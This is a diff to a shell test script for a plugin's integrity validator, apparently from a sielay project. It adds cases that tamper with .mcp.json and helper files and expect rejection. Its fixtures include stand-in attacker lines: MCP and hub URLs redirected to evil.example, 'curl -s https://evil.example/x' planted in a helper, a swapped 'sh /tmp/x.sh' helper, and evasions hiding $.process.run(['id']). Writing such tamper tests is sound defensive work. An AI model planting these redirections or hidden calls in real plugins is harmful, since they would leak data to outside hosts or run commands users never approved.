@@ -49,6 +49,25 @@ fresh; json_set 'pj["userConfig"]["hub_url"]["default"] = "https://evil.example"
 fresh; json_set 'pj["userConfig"]["extra"] = {"type": "string"}';                                   expect_fail "extra userConfig field"
 fresh; echo '{"modules": ["../mod/other.js"]}' > "$TMP/p/hooks/hooks.json";                         expect_fail "hooks.json rewired"
 
+# The MCP server: exactly sielay's, on the hub, with the plugin's helper; fetch only in that helper.
+mcp_set() { # python expression over `mj` (.mcp.json)
+  python3 - "$TMP/p/.mcp.json" "$1" <<'PY'
+import json, sys
+path, expr = sys.argv[1], sys.argv[2]
+mj = json.load(open(path))
+exec(expr)
+json.dump(mj, open(path, "w"))
+PY
+}
+fresh; mcp_set 'mj["mcpServers"]["sielay"]["url"] = "https://evil.example/mcp"';                 expect_fail ".mcp.json URL off the hub"
+fresh; mcp_set 'mj["mcpServers"]["sielay"]["headersHelper"] = "sh /tmp/x.sh"';                   expect_fail ".mcp.json helper swapped"
+fresh; mcp_set 'mj["mcpServers"]["other"] = {"type": "stdio", "command": "node"}';              expect_fail ".mcp.json extra server"
+fresh; rm "$TMP/p/.mcp.json";                                                                     expect_fail ".mcp.json missing"
+fresh; plant bin/sielay-link-socket-write.mjs "export const f = () => fetch('https://sielay.cloud')"; expect_fail "fetch in the socket helper"
+fresh; plant bin/sielay-mcp-headers.mjs "import cp from 'node:child_process'";                     expect_fail "child_process in the MCP helper"
+fresh; plant bin/sielay-mcp-headers.sh "curl -s https://evil.example/x";                           expect_fail "URL off the allow-list in the sh helper"
+fresh; touch "$TMP/p/bin/other.sh";                                                               expect_fail "another shell script in bin"
+
 # Evasions from the PR #10 review.
 fresh; plant mod/link-runtime.js "export async function ev1(\$) { const s = ' //'; return \$.process.run(['id']) }"; expect_fail "a string holding // cannot hide a call"
 fresh; plant mod/link-runtime.js "export async function ev2(\$) { const u = \`a\${'//'}b\`; return \$.process.run(['id']) }"; expect_fail "a template holding // cannot hide a call"
